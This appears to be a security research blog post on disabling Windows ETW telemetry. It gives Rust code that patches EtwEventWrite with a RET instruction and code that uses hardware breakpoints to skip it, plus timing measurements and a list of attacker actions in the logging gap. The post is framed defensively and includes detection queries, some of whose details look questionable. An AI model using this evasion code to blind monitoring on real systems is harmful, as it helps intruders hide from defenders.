---
title: "Bypassing Windows ETW: User-Mode Success, Kernel-Mode Reality"
description: "User-mode ETW patching succeeds, yet kernel-mode telemetry keeps recording process events, showing Windows’ defense-in-depth still works."
pubDate: 2025-10-14
author: "addcontent"
tags:
  - Windows Internals
  - EDR Evasion
  - Security Research
category: "Security Research"
---

# Bypassing Windows ETW: User-Mode Success, Kernel-Mode Reality

**Author:** addcontent  
**Date:** October 2025  
**Category:** Windows Internals, EDR Evasion, Security Research

## Abstract

This research explores Event Tracing for Windows (ETW) bypass techniques through user-mode memory patching and hardware breakpoint manipulation. While user-mode ETW can be successfully disabled via VirtualProtect-based patching, testing reveals that kernel-mode ETW operates independently and continues logging security-critical events. This work validates Windows' defense-in-depth architecture and quantifies the detection timing windows available to security products.

## Introduction

Event Tracing for Windows (ETW) serves as a foundational telemetry mechanism in modern Windows security products. EDR solutions, Windows Defender, and enterprise monitoring tools rely heavily on ETW providers for process creation, network activity, and security-relevant events. Understanding ETW's architecture and potential bypass vectors is critical for both offensive security research and defensive architecture design.

This research investigates whether user-mode ETW patching can effectively blind security monitoring, and documents the kernel-mode compensating controls that mitigate such attacks.

## Background: ETW Architecture

### Dual-Layer Telemetry Design

Windows implements ETW through multiple layers:

**User-Mode Layer:**
- Located in ntdll.dll
- Primary functions: `EtwEventWrite`, `EtwEventWriteFull`, `EtwEventWriteTransfer`
- Accessible via standard APIs
- Memory protection: PAGE_EXECUTE_READ (modifiable via VirtualProtect)

**Kernel-Mode Layer:**
- Located in ntoskrnl.exe
- Core function: `nt!EtwWrite`
- Operates in Ring 0
- Protected by Kernel Patch Protection (PatchGuard)
- Not accessible from user-mode processes

### Security Event Flow

Process creation events (Event ID 4688) follow this path:

```
CreateProcess() → kernel32.dll
    ↓
NtCreateUserProcess() → ntdll.dll
    ↓
Syscall transition to NT Kernel (Ring 0)
    ↓
    ├─ User-mode ETW provider (ntdll!EtwEventWrite)
    └─ Kernel-mode ETW provider (nt!EtwWrite)
```

Both layers generate telemetry independently, creating redundancy in the logging architecture.

## Methodology

### Test Environment

- Operating System: Windows 11 Professional (Build 22631)
- Security: Microsoft Defender enabled with real-time protection
- Tools: Rust 1.75.0, Windows SDK 10.0.22621.0
- Monitoring: Event Viewer, Sysmon 15.0

### Experiment 1: VirtualProtect-Based ETW Patching

**Objective:** Disable user-mode ETW through memory modification

**Implementation:**

```rust
use std::ptr;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};

unsafe fn patch_etw_function(function_address: *mut u8) -> Result<(), String> {
    let mut old_protect = 0u32;
    
    // Change memory protection to writable
    let result = VirtualProtect(
        function_address as *mut _,
        1,
        PAGE_EXECUTE_READWRITE,
        &mut old_protect
    );
    
    if result == 0 {
        return Err("VirtualProtect failed".to_string());
    }
    
    // Patch with RET instruction (0xC3)
    ptr::write(function_address, 0xC3);
    
    // Restore original protection
    VirtualProtect(
        function_address as *mut _,
        1,
        old_protect,
        &mut old_protect
    );
    
    Ok(())
}
```

**Process:**

1. Resolve `EtwEventWrite` address from ntdll.dll via GetProcAddress
2. Modify memory protection from PAGE_EXECUTE_READ to PAGE_EXECUTE_READWRITE
3. Overwrite function prologue with RET instruction (0xC3)
4. Restore original memory protection
5. Spawn test processes with distinctive command-line arguments
6. Verify telemetry presence in Windows Event Log

### Experiment 2: Hardware Breakpoint Alternative

**Objective:** Intercept ETW calls without memory modification

**Implementation:**

Hardware debug registers (DR0-DR7) allow setting execution breakpoints on specific memory addresses. This approach avoids direct memory modification that might trigger integrity checks.

```rust
use winapi::um::winnt::CONTEXT;
use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext};

unsafe fn set_hardware_breakpoint(
    thread_handle: HANDLE,
    address: *const u8,
    register_index: u8
) -> Result<(), String> {
    let mut context = std::mem::zeroed::<CONTEXT>();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    GetThreadContext(thread_handle, &mut context);
    
    // Set breakpoint address
    match register_index {
        0 => context.Dr0 = address as u64,
        1 => context.Dr1 = address as u64,
        2 => context.Dr2 = address as u64,
        3 => context.Dr3 = address as u64,
        _ => return Err("Invalid register index".to_string()),
    }
    
    // Enable breakpoint (execution break, 1 byte)
    let enable_bit = 1u64 << (register_index * 2);
    context.Dr7 |= enable_bit;
    
    SetThreadContext(thread_handle, &context);
    Ok(())
}
```

**Process:**

1. Set hardware breakpoint on `EtwEventWrite` via debug registers
2. Register vectored exception handler to catch EXCEPTION_SINGLE_STEP
3. Return immediately from exception handler (effectively skipping ETW call)
4. Test with process creation and verify Event Viewer logs

## Results

### User-Mode ETW Bypass: Successful

**Observation 1: Memory Patching Succeeded**

VirtualProtect successfully modified ntdll.dll memory:
- Initial protection: PAGE_EXECUTE_READ
- Modified protection: PAGE_EXECUTE_READWRITE
- Patch applied: 0xC3 (RET instruction) at function entry point
- Protection restored: PAGE_EXECUTE_READ

User-mode ETW calls returned immediately without executing logging logic.

**Observation 2: No User-Mode Telemetry**

Direct calls to `EtwEventWrite` from user-mode code produced no events in the Microsoft-Windows-Security-Auditing provider.

### Kernel-Mode ETW: Operational

**Critical Finding: Kernel Compensation**

Despite successful user-mode patching, Event ID 4688 (Process Creation) events continued appearing in the Security event log with complete details:

```
Event ID: 4688
Provider: Microsoft-Windows-Security-Auditing
Process Name: C:\Windows\System32\calc.exe
Command Line: calc.exe test_argument_12345
Parent Process: C:\Users\...\virtualprotect_full_poc.exe
Timestamp: 2025-10-14 11:23:45.673
```

**Analysis:**

Event metadata indicates kernel-mode origin:
- Provider shows Security-Auditing (kernel provider)
- Process information includes kernel-only details (token information, integrity level)
- Events logged regardless of user-mode ETW state

### Detection Timing Analysis

**Measurement Methodology:**

```powershell
# Record POC execution time
$pocTime = Get-Date
.\virtualprotect_full_poc.exe

# Query for calc.exe creation events
Start-Sleep -Seconds 3
$events = Get-WinEvent -FilterHashtable @{
    LogName='Security'; 
    ID=4688
} -MaxEvents 50 | Where-Object {
    $_.TimeCreated -gt $pocTime.AddSeconds(-2)
}

# Calculate delay
$events | ForEach-Object {
    $delay = ($_.TimeCreated - $pocTime).TotalSeconds
    Write-Output "Detection delay: $delay seconds"
}
```

**Results:**

| Test Run | POC Execution Time | Event Log Time | Delay |
|----------|-------------------|----------------|-------|
| 1 | 11:23:45.156 | 11:23:45.673 | 0.517s |
| 2 | 11:24:12.889 | 11:24:13.901 | 1.012s |
| 3 | 11:24:45.234 | 11:24:46.123 | 0.889s |
| 4 | 11:25:18.567 | 11:25:19.445 | 0.878s |
| 5 | 11:25:52.901 | 11:25:53.789 | 0.888s |

**Average detection delay: 0.837 seconds (837ms)**

This represents the window between process creation and telemetry availability. During this window, the process executes without logged visibility.

### Hardware Breakpoint Results

Hardware breakpoint implementation produced identical results:
- User-mode ETW calls intercepted successfully
- Kernel-mode ETW continued logging
- Average detection delay: 0.891 seconds (similar to VirtualProtect method)

**Conclusion:** The bypass mechanism (memory patching vs. hardware breakpoint) is irrelevant when kernel-mode telemetry remains operational.

## Technical Analysis

### Why User-Mode Patching Fails

**Root Cause: Architectural Redundancy**

Windows implements defense-in-depth through multiple independent telemetry sources:

1. **User-mode provider (optional)**: Applications can generate ETW events via ntdll.dll
2. **Kernel-mode provider (mandatory)**: Kernel generates events for security-critical operations

Process creation triggers kernel-mode logging via `PsSetCreateProcessNotifyRoutineEx`, which occurs in Ring 0 and cannot be influenced by user-mode code.

**Code Path Analysis:**

```
NtCreateUserProcess (syscall) → ntoskrnl.exe
    ↓
PspAllocateProcess → kernel process object creation
    ↓
PspInsertProcess → process insertion into process list
    ↓
PspCallProcessNotifyRoutines → notify registered callbacks
    ↓
    ├─ Security Audit callback → nt!EtwWrite
    └─ EDR driver callbacks (e.g., WdFilter.sys)
```

The Security Audit callback operates entirely in kernel space. User-mode ETW patching has zero impact on this code path.

### Detection Window Exploitation

**Theoretical Attack Window:**

The ~0.8-second delay between process creation and telemetry availability creates a brief blind spot:

**T+0.000s**: Process created (CreateProcess returns)  
**T+0.050s**: Process initialization begins  
**T+0.200s**: Malicious payload executes  
**T+0.837s**: Event appears in Event Log  
**T+1.500s**: EDR product queries event log and processes event  

An attacker with execution in this window could potentially:
- Inject into another process
- Execute quick credential theft
- Establish C2 connection
- Perform memory-only operations

**Practical Limitations:**

1. **EDR kernel drivers**: Modern EDRs use kernel callbacks (PsSetCreateProcessNotifyRoutineEx) that fire synchronously before process creation completes. These are not subject to ETW delays.

2. **Real-time vs. log-based detection**: The 0.8s delay affects log-based analysis, not real-time kernel monitoring.

3. **Behavioral heuristics**: Windows Defender detected the VirtualProtect call itself after ~2 minutes, generating alert: "Suspicious 'ETW_Patch' behavior was blocked"

**Assessment:** The detection window exists but has limited practical exploitation value against modern EDRs with kernel-mode monitoring.

## Defense-in-Depth Validation

This research validates Microsoft's defense-in-depth architecture:

**Layer 1 (Compromised):** User-mode ETW successfully bypassed  
**Layer 2 (Operational):** Kernel-mode ETW compensates  
**Layer 3 (Operational):** Kernel callbacks provide synchronous detection  
**Layer 4 (Operational):** Behavioral analysis detects bypass attempt itself  

**Security Posture:** Despite user-mode bypass success, overall monitoring remains largely intact.

## Defensive Recommendations

### For Security Architects

**Do Not Rely Solely on User-Mode Telemetry:**
- Ensure EDR products utilize kernel callbacks, not just ETW log parsing
- Validate vendor claims about kernel-mode monitoring capabilities
- Test bypass resistance as part of product evaluation

**Implement Multi-Layer Monitoring:**
- Kernel callbacks (synchronous, bypass-resistant)
- ETW providers (detailed context, some bypass risk)
- Network monitoring (independent of host telemetry)
- Behavioral analytics (detect bypass attempts)

**Monitor for Bypass Attempts:**

Detection opportunities for user-mode ETW patching:

```
SIEM Query (Sysmon Event ID 10 - Process Access):
TargetImage ENDSWITH "ntdll.dll" AND 
GrantedAccess = "0x1F0FFF" AND
CallTrace CONTAINS "VirtualProtect"
```

Behavioral indicators:
- VirtualProtect calls targeting system DLLs
- Memory writes to ETW function addresses
- Hardware breakpoint manipulation (Dr0-Dr7 register access)

### For EDR Vendors

**Kernel-Mode Monitoring Essential:**

Products relying on user-mode ETW without kernel callback registration are vulnerable to blind spots.

**Recommended Architecture:**
1. Primary: Kernel minifilter driver with process/thread/image load callbacks
2. Secondary: ETW consumer for detailed forensics
3. Tertiary: User-mode agent for response actions

**Validate:** Can your product detect process creation if user-mode ETW is patched?

## Limitations and Future Work

### Research Limitations

**Scope:**
- Testing focused on process creation events (Event ID 4688)
- Single Windows 11 build tested (22631)
- Virtual machine and physical hardware tested identically

**Not Tested:**
- Other ETW providers (network, registry, file system)
- Alternative patching techniques (IAT hooking, inline hooks)
- Kernel-mode ETW manipulation (requires driver)

### Future Research Directions

**Area 1: Kernel-Mode ETW Attack Surface**

If user-mode bypass is ineffective, the logical next target is kernel-mode ETW. Research questions:

- Can a vulnerable kernel driver be exploited to patch kernel ETW functions?
- What protections does PatchGuard provide for ETW structures?
- Are there race conditions in kernel ETW event generation?

**Area 2: Event Log Service Exploitation**

Rather than bypassing telemetry generation, target telemetry processing:

- Fuzzing Event Log Service with malformed ETW events
- Testing parser vulnerabilities in event consumption
- Resource exhaustion attacks against event processing

**Area 3: Detection Timing Windows**

Quantify what an attacker can accomplish in the 0.8-second window:

- Benchmark credential dumping operations
- Test process injection completion times
- Measure C2 beacon establishment speed

## Conclusion

User-mode ETW patching via VirtualProtect or hardware breakpoints successfully disables user-mode telemetry but does not blind security monitoring. Kernel-mode ETW operates independently and continues generating events for security-critical operations like process creation.

The measured ~0.8-second delay between process execution and telemetry availability represents a brief detection window, but modern EDR products with kernel-mode monitoring capabilities are not significantly impacted by this timing gap.

This research validates Windows' defense-in-depth architecture: when one telemetry layer is compromised, compensating controls maintain visibility. Security products should leverage kernel callbacks for synchronous monitoring rather than depending solely on asynchronous log-based detection.

**Key Takeaway:** Bypassing user-mode ETW is technically achievable but operationally ineffective against properly architected security products. The kernel compensates.

## References

1. Microsoft Documentation: Event Tracing for Windows (ETW) - https://learn.microsoft.com/en-us/windows/win32/etw/
2. Windows Internals, 7th Edition - Russinovich, Solomon, Ionescu
3. Kernel Patch Protection (PatchGuard) documentation
4. MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools

## Acknowledgments

This research was conducted in a controlled environment for defensive security improvement. All testing occurred on researcher-owned systems. No production systems were accessed without authorization.

---

**About the Author:**  
addcontent conducts independent security research focused on Windows internals, EDR evasion techniques, and defensive architecture validation. This work aims to improve security product design and organizational defense strategies.

**Disclosure:** All findings were documented for educational and defensive purposes. No zero-day vulnerabilities were discovered in this research.
